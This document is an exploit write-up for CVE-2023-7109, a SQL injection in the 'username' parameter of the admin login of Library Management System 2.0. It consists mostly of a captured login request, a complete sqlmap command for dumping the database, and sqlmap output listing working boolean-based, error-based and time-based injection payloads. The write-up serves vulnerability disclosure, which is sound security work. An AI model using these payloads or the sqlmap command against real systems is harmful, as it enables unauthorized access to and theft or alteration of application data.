# CVE-2023-7109_Library-Management-System_SQL_Injection-1
+ **Exploit Title:** CVE-2023-7109_Library-Management-System_SQL_Injection-1
+ **Date:** 2023-23-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/library-management-system-in-php-with-source-code-ver-2-0/
+ **Software Link:** https://download-media.code-projects.org/2020/02/LIBRARY_MANAGEMENT_SYSTEM_IN_PHP_WITH_SOURCE_CODE_VER.2.0.zip
+ **Version:** 2.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-2023-7109

## References: 
+ **CVE-2023-7109:** https://vuldb.com/?id.249004
+ https://www.cve.org/CVERecord?id=CVE-2023-7109

## Description:
Library Management System 2.0 allows SQL Injection via parameter 'username' in "/libsystem/admin/login.php". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the admin panel: "http://localhost/libsystem/admin/login.php"
+ Fill the username and password then click 'Sign In' button.
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Captured Burp request:
```
POST /libsystem/admin/login.php HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 313
Content-Type: application/x-www-form-urlencoded
Referer: http://localhost/libsystem/admin/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36

username=admin&login=&password=Pass
```

+ Use sqlmap to exploit. In sqlmap, use 'username' parameter to dump the database. 
```
python sqlmap.py -r r.txt -p username --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
```

```
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin' OR NOT 3872=3872-- DYwR&login=&password=pass

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 8182 FROM(SELECT COUNT(*),CONCAT(0x71716b7a71,(SELECT (ELT(8182=8182,1))),0x7178706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jrIz&login=&password=pass

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 9071 FROM (SELECT(SLEEP(5)))PbNC)-- yHio&login=&password=pass
---
[12:40:04] [INFO] testing MySQL
[12:40:04] [INFO] confirming MySQL
[12:40:04] [INFO] the back-end DBMS is MySQL
web application technology: PHP, Apache 2.4.53, PHP 8.1.6
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[12:40:04] [INFO] fetching current database
[12:40:04] [INFO] resumed: 'libsystem'
current database: 'libsystem'
```

+ current database: `libsystem`
![1](https://github.com/h4md153v63n/CVEs/assets/5091265/ed5fefd1-2d1a-4b64-b2b7-c9b4f24b468b)
